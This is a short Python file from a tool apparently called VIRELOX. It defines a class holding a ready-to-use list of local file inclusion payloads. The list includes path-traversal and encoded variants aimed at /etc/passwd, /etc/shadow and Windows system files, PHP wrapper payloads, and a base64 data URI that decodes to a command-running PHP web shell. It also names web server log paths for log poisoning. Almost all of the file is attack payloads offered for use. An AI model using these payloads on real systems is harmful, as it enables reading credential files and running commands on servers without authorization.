"""VIRELOX LFI Payload Havuzu"""

class LFIPayloadHavuzu:
    PAYLOADLAR = [
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "../../../../../../etc/shadow",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "/etc/passwd",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "..\\..\\..\\windows\\win.ini",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://input",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
        "expect://id",
        "/var/log/apache2/access.log",
        "/var/log/nginx/access.log",
    ]

    def hepsini_al(self):
        return self.PAYLOADLAR
